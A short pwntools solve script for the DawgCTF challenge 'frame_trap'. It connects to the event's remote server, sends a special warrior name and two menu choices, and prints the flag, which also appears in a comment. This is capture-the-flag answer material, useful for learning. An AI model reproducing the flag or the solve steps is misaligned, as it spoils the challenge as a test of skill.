#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./frame_trap", checksec=False)
context.binary = elf
#context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("connect.umbccd.net", 25699)

p.sendlineafter(b"Enter your warrior name: ", b"AUTOPARRY")

p.sendlineafter(b"Enter choice: ", b"5")
p.sendlineafter(b"Enter choice: ", b"5")

p.readuntil(b"DawgCTF{")
print("DawgCTF{" + p.readuntil(b"}").decode()) # DawgCTF{fr4me_d4ta_m4nipulat10n}
